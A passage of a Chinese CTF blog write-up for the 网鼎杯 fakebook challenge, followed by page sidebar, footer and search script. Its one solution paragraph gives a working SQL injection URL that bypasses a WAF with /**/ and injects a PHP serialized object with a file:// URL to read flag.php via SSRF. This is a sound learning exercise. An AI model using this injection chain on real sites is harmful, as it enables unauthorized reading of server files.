+<p>sqlmap跑一下发现存储的是php序列化的数据.<br>整理出思路：利用no参数进行注入，在反序列化中构造file文件协议，利用服务端请求伪造漏洞访问服务器上的flag.php文件。<br>构造注入:<code>view.php?no=0/**/union/**/select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}&#39;</code><br>直接用 union select 会被WAF检测到，所以使用 /**/ 来绕过，反序列化字符串对应数据库data列放在第四列（fuzz测试，爆列名），注入后bolg栏显示file:///var/www/html/flag.php，代表注入成功，审计页面源码，发现<iframe width="100%" height="10em" src="data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3s3YjY1NzM3Zi04NzA4LTQ2ZmYtODhmOC0wMDY4YzY4NTlhMmN9IjsNCmV4aXQoMCk7DQo=">标签，点击链接，拿到flag。</iframe></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/12/25/http-smuggle/" rel="next" title>
+                <i class="fa fa-chevron-left"></i> 
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/12/25/模板注入/" rel="prev" title>
+                 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Horizon</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#关于phar反序列化"><span class="nav-number">1.</span> <span class="nav-text">关于phar反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#phar反序列化"><span class="nav-number">1.1.</span> <span class="nav-text">phar反序列化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN2019-华北赛区-Day1-Web1-Dropbox"><span class="nav-number">1.2.</span> <span class="nav-text">[CISCN2019 华北赛区 Day1 Web1]Dropbox</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0CTF-2016-piapiapia-php反序列化长度变化尾部字符串逃逸"><span class="nav-number">2.</span> <span class="nav-text">0CTF-2016-piapiapia(php反序列化长度变化尾部字符串逃逸)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#网鼎杯-fakebook"><span class="nav-number">3.</span> <span class="nav-text">网鼎杯 fakebook</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Horizon</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+ <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+   <span id="busuanzi_container_site_pv">本站总访问量<spanid="busuanzi_value_site_pv"></spanid="busuanzi_value_site_pv"></span>次
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
